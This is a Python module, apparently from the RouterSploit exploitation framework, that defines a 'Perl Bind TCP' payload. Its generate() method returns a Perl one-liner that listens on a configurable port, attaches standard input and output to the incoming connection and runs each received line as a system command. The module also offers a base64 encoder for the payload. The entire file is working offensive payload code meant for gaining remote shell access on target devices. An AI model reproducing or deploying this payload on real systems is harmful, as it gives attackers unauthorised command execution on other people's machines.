from routersploit.core.exploit.option import OptEncoder
from routersploit.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    BindTCPPayloadMixin,
)
from routersploit.modules.encoders.perl.base64 import Encoder


class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Perl Bind TCP",
        "description": "Creates interactive tcp bind shell by using perl.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.PERL
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "use IO;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort," +
            str(self.rport) +
            ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){" +
            "if($_=~ /(.*)/){system $1;}};"
        )
